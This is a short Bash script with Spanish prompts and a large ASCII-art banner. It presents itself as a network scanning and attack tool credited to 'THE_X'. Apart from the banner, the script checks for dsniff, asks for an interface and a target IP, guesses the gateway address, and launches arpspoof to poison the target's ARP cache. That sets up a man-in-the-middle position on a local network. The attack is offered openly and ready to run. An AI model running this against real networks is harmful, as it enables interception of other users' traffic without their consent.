#!/bin/bash

# Definir la secuencia de escape para el color verde
GREEN='\033[0;32m'

# Restablecer el color
NC='\033[0m'

# Imprimir texto en color verde
echo -e "${GREEN}\CREADO POR THE_X/${NC}"

cat << "EOF"

   ####   ##   ##   ####    ##   ##   ####              ##   ##   ####      #####   ####
  ##  ##  ##   ##    ##     ##  ##     ##               ##   ##    ##      ##        ##
 ##       ##   ##    ##     #####      ##               ##   ##    ##     ##         ##
 ##       #######    ##     ####       ##               ## # ##    ##     ######     ##
 ##   ##  ##   ##    ##     #####      ##               #######    ##     ##         ##
 ##  ##   ##   ##    ##     ##  ##     ##               #######    ##     ##         ##
  ####    ##   ##   ####    ##   ##   ####              ##   ##   ####    ##        ####
                                             #########

                    (Escaner y ataque de redes v 1.0)

                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     ⠀⢀⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                         ⠀⠀⠀⣼⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀                         ⠀⢤⣄⣀⣀⣀⣰⡇⠈⣧⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀                         ⠀⠈⠻⢦⡀⠀⠀⠀⠀⢀⣠⠾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀     ⠀⠀                    ⠀⠀⣹⠃⠀⡀⠀⢿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀     ⠀⣠⠔⠂⠀⠀⠀⢠⣏⣴⠞⠛⢦⣜⣧⠀⠀⠀⠀⠢⣄⡀⠀⠀⠀⠀
⠀⠀                         ⢠⣖⡿⡋⠀⠀⠀⠀⠀⠾⠋⠀⠀⠀⠀⠉⠻⡄⠀⠀⠀⠀⢝⢿⣱⣄⠀⠀
                         ⠀⡜⣿⣨⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⣤⡀⠀⠀⠀⠀⠀⠈⢳⣇⣿⢡⠀
                         ⢰⣇⣟⣵⠃⠀⠀⠀⠀⠀⠀⢀⣴⣦⡤⠀⠀⠈⠻⣷⡀⠀⠀⠀⠀⠈⣯⡻⢸⡆
                         ⡆⣿⡾⡅⠀⠀⠀⠀⠀⢀⣴⣿⣿⣏⠀⠀⠀⠀⠀⠹⣿⡆⠀⠀⠀⠀⢨⢻⣾⢱
                         ⣷⡘⣱⠇⠀⠀⠀⠀⠀⠀⠹⠋⠈⠻⣷⣄⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠘⣧⢋⣾
                         ⡼⣷⡿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⢀⣿⣿⠀⠀⠀⠀⢰⢻⣾⢇
                         ⢳⣌⠇⣿⠀⠀⠀⠀⠀⠀⣴⢶⣤⣀⡀⠀⠈⢻⣷⣾⣿⠏⠀⠀⠀⠀⣿⠸⣡⡞
                         ⠀⡿⢷⣿⡸⣄⠀⢀⣴⡾⠉⠀⠈⠛⠿⢿⣿⣿⡿⠿⣷⣄⠀⠀⢠⡇⣿⡾⢛⠀
                         ⠀⠘⢦⣝⡣⢿⡦⡈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠋⢀⣴⡿⣘⣭⡶⠃⠀
⠀⠀                         ⠀⠹⣛⠿⠷⡹⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⢟⠾⠟⣛⠝⠀⠀⠀
⠀⠀⠀⠀                         ⠈⠛⡿⠿⠶⢛⣫⣤⡶⣒⡶⠶⣖⠶⣶⣍⣛⠚⠿⣟⠛⠁⠀⠀⠀⠀
     ⠀⠀⠀⠀⠀                    ⠀⠈⠙⠛⠛⠋⢡⠞⠁⠀⠀⠈⠻⣮⠙⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀
EOF
echo -e "${GREEN}\CREADO POR THE_X/${NC}"
check_herramienta()
{
if ! [ -x "$(command -v $1)" ]; then
	echo "ERROR: $1 no esta instalada,instala $1 vuelve a intentarlo" >&2
	exit 1
	fi
}


check_herramienta "dsniff"

read -p "Inserte la interfaz de de red que desee analizar : " interfaz
read -p "Inserte la ip objetivo : " ip
puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')

arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"
